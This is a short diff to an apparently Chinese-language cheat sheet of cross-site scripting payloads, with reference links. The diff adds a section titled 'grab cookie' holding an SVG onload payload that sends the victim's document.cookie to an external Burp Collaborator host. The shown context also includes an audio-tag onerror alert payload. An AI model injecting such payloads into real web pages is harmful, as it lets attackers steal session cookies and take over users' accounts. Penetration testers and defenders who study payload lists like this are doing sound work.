@@ -486,6 +486,13 @@ http://drops.wooyun.org/tips/147
 【audio标签】 
 <audio src=x onerror=alert(47)>
 
+
+### 拿cookie
+```
+<svg onload=document.location='http://gp913e051giaos37xrsehq7f2681wq.burpcollaborator.net/?cookie='+document.cookie//<<SCRIPT>
+```
+
+
 ### Ref
  
 - https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec
